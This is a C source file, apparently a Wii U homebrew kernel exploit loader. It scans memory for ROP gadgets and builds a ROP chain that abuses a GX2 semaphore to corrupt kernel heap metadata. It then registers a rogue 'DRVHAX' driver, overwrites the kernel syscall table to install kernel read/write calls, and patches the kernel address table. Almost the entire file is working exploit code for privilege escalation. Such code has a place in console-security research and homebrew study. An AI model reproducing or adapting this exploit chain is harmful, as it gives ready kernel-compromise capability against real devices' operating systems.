#include "loader.h"

void _start()
{
	/* Load a good stack */
	asm(
		"lis %r1, 0x1ab5 ;"
		"ori %r1, %r1, 0xd138 ;"
	);

	/* Get a handle to coreinit.rpl and gx2.rpl */
	unsigned int coreinit_handle, gx2_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
	OSDynLoad_Acquire("gx2.rpl", &gx2_handle);

	/* Exit functions */
	void (*__PPCExit)();
	void (*_Exit)();
	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);

	/* Memory functions */
	void (*DCFlushRange)(void *buffer, uint32_t length);
	void (*DCInvalidateRange)(void *buffer, uint32_t length);
	void (*DCTouchRange)(void *buffer, uint32_t length);
	uint32_t (*OSEffectiveToPhysical)(void *vaddr);
	void* (*OSAllocFromSystem)(uint32_t size, int align);
	void (*OSFreeToSystem)(void *ptr);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCTouchRange", &DCTouchRange);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);

	/* OS thread functions */
	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t *stack, uint32_t stack_size, int priority, uint16_t attr);
	int (*OSResumeThread)(void *thread);
	void (*OSExitThread)();
	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSExitThread", &OSExitThread);

	/* OSDriver functions */
	uint32_t reg[] = {0x38003200, 0x44000002, 0x4E800020};
	OSDriver (*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t) __PPCExit);
	uint32_t dereg[] = {0x38003300, 0x44000002, 0x4E800020};
	uint32_t (*Deregister)(char *driver_name, uint32_t name_length) = find_gadget(dereg, 0xc, (uint32_t) __PPCExit);
	uint32_t copyfrom[] = {0x38004700, 0x44000002, 0x4E800020};
	uint32_t (*CopyFromSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyfrom, 0xc, (uint32_t) __PPCExit);
	uint32_t copyto[] = {0x38004800, 0x44000002, 0x4E800020};
	uint32_t (*CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length) = find_gadget(copyto, 0xc, (uint32_t) __PPCExit);

	/* GX2 functions */
	void (*GX2SetSemaphore)(uint64_t *sem, int action);
	void (*GX2Flush)(void);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2SetSemaphore", &GX2SetSemaphore);
	OSDynLoad_FindExport(gx2_handle, 0, "GX2Flush", &GX2Flush);

	/* Allocate space for DRVHAX */
	OSDriver *drvhax = OSAllocFromSystem(sizeof(OSDriver), 4);

	/* Set the kernel heap metadata entry */
	uint32_t *metadata = (uint32_t*) (KERN_HEAP + METADATA_OFFSET + (0x02000000 * METADATA_SIZE));
	metadata[0] = (uint32_t)drvhax;
	metadata[1] = (uint32_t)-0x4c;
	metadata[2] = (uint32_t)-1;
	metadata[3] = (uint32_t)-1;
	
	/* Find some gadgets */
	uint32_t gx2data[] = {0xfc2a0000};
	uint32_t gx2data_addr = (uint32_t) find_gadget(gx2data, 0x04, 0x10000000);
	uint32_t r3r4load[] = {0x80610008, 0x8081000C, 0x80010014, 0x7C0803A6, 0x38210010, 0x4E800020};
	uint32_t r3r4load_addr = (uint32_t) find_gadget(r3r4load, 0x18, 0x01000000);
	uint32_t r30r31load[] = {0x80010014, 0x83e1000c, 0x7c0803a6, 0x83c10008, 0x38210010, 0x4e800020};
	uint32_t r30r31load_addr = (uint32_t) find_gadget(r30r31load, 0x18, 0x01000000);
	uint32_t doflush[] = {0xba810008, 0x8001003c, 0x7c0803a6, 0x38210038, 0x4e800020, 0x9421ffe0, 0xbf61000c, 0x7c0802a6, 0x7c7e1b78, 0x7c9f2378, 0x90010024};
	uint32_t doflush_addr = (uint32_t) find_gadget(doflush, 0x2C, 0x01000000) + 0x14 + 0x18;
	
	/* Modify a next ptr on the heap */
	uint32_t kpaddr = KERN_HEAP_PHYS + STARTID_OFFSET;

	/* Make a thread to modify the semaphore */
	OSContext *thread = (OSContext*)OSAllocFromSystem(0x1000,8);
	uint32_t *stack = (uint32_t*)OSAllocFromSystem(0xa0,0x20);
	if (!OSCreateThread(thread, (void*)0x11a1dd8, 0, NULL, stack + 0x28, 0xa0, 0, 0x1 | 0x8)) OSFatal("Failed to create thread");

	/* Set up the ROP chain */
	thread->gpr[1] = (uint32_t)stack;
	thread->gpr[3] = kpaddr;
	thread->gpr[30] = gx2data_addr;
	thread->gpr[31] = 1;
	thread->srr0 = ((uint32_t)GX2SetSemaphore) + 0x2C;
	DCFlushRange(thread, 0x1000);

	stack[0x24/4] = r30r31load_addr;					/* Load r30/r31 - stack=0x20 */
	stack[0x28/4] = gx2data_addr;						/* r30 = GX2 data area */
	stack[0x2c/4] = 1;									/* r31 = 1 (signal) */

	stack[0x34/4] = r3r4load_addr;						/* Load r3/r4 - stack=0x30 */
	stack[0x38/4] = kpaddr;

	stack[0x44/4] = ((uint32_t)GX2SetSemaphore) + 0x2C;	/* GX2SetSemaphore() - stack=0x40 */

	stack[0x64/4] = r30r31load_addr;					/* Load r30/r31 - stack=0x60 */
	stack[0x68/4] = 0x100;								/* r30 = r3 of do_flush = 0x100 */
	stack[0x6c/4] = 1;									/* r31 = r4 of do_flush = 1 */

	stack[0x74/4] = doflush_addr;						/* do_flush() - stack=0x70 */

	stack[0x94/4] = (uint32_t)OSExitThread;

	DCFlushRange(stack, 0xa0);

	/* Start the thread */
	OSResumeThread(thread);

	/* Wait for a while */
	int ctr = 0;
	for (int i = 0; i < 100000000; i++) ctr++;

	/* Free stuff */
	OSFreeToSystem(thread);
	OSFreeToSystem(stack);
	
	/* Register a new OSDriver, DRVHAX */
	char drvname[6] = {'D', 'R', 'V', 'H', 'A', 'X'};
	Register(drvname, 6, NULL, NULL);

	/* Modify its save area to point to the kernel syscall table */
	drvhax->save_area = (uint32_t*)KERN_SYSCALL_TBL + (0x34 * 4);

	/* Use DRVHAX to install the read and write syscalls */
	uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};
	CopyToSaveArea(drvname, 6, syscalls, 8);
	
	/* Clean up the heap and driver list so we can exit */
	kern_write((void*)(KERN_HEAP + STARTID_OFFSET), 0);
	kern_write((void*)KERN_DRVPTR, (uint32_t)drvhax->next);

	/* Modify the kernel address table and exit */
	kern_write(KERN_ADDRESS_TBL + 0x12, 0x31000000);
	kern_write(KERN_ADDRESS_TBL + 0x13, 0x28305800);
	
	_Exit();

	while(1);
}

/* Simple memcmp() implementation */
int memcmp(void *ptr1, void *ptr2, uint32_t length)
{
	uint8_t *check1 = (uint8_t*) ptr1;
	uint8_t *check2 = (uint8_t*) ptr2;
	uint32_t i;
	for (i = 0; i < length; i++)
	{
		if (check1[i] != check2[i]) return 1;
	}

	return 0;
}

void* memcpy(void* dst, const void* src, uint32_t size)
{
	uint32_t i;
	for (i = 0; i < size; i++)
		((uint8_t*) dst)[i] = ((const uint8_t*) src)[i];
	return dst;
}

/* Find a gadget based on a sequence of words */
void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start)
{
	uint32_t *ptr;

	/* Search code before JIT area first */
	for (ptr = (uint32_t*)gadgets_start; ptr != (uint32_t*)JIT_ADDRESS; ptr++)
	{
		if (!memcmp(ptr, &code[0], length)) return ptr;
	}

	/* Restart search after JIT */
	for (ptr = (uint32_t*)CODE_ADDRESS_START; ptr != (uint32_t*)CODE_ADDRESS_END; ptr++)
	{
		if (!memcmp(ptr, &code[0], length)) return ptr;
	}

	((void (*)())0x101cd80)();
	return NULL;
}

/* Chadderz's kernel read function */
uint32_t kern_read(const void *addr)
{
	uint32_t result;
	asm(
		"li 3,1\n"
		"li 4,0\n"
		"li 5,0\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%1\n"
		"li 0,0x3400\n"
		"mr %0,1\n"
		"sc\n"
		"nop\n"
		"mr 1,%0\n"
		"mr %0,3\n"
		:	"=r"(result)
		:	"b"(addr)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
	);

	return result;
}

/* Chadderz's kernel write function */
void kern_write(void *addr, uint32_t value)
{
	asm(
		"li 3,1\n"
		"li 4,0\n"
		"mr 5,%1\n"
		"li 6,0\n"
		"li 7,0\n"
		"lis 8,1\n"
		"mr 9,%0\n"
		"mr %1,1\n"
		"li 0,0x3500\n"
		"sc\n"
		"nop\n"
		"mr 1,%1\n"
		:
		:	"r"(addr), "r"(value)
		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
			"11", "12"
		);
}
